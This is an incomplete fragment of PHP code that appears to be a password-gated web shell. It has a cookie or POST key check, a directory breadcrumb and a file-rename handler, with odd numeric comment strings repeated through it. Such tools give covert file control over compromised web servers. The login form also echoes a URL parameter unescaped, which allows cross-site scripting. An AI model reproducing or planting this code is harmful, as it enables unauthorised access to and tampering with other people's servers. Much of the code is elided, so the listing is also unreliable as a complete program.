...
$pass = false;
if (isset($_COOKIE['pw_name_50307'])) {
    if(($_COOKIE['pw_name_50307']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50307'])) {
        if(($_POST['pw_name_50307']) == $auth_key) {
            setcookie("pw_name_50307", $_POST['pw_name_50307']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50307' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1705711489660551 1705711489699982 1705711489939043 1705711489675777
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1705711489660551 1705711489699982 1705711489939043 1705711489675777
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1705711489660551 1705711489699982 1705711489939043 1705711489675777
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1705711489660551 1705711489699982 1705711489939043 1705711489675777
            $name = PATH . "/" . $_GET['r'];
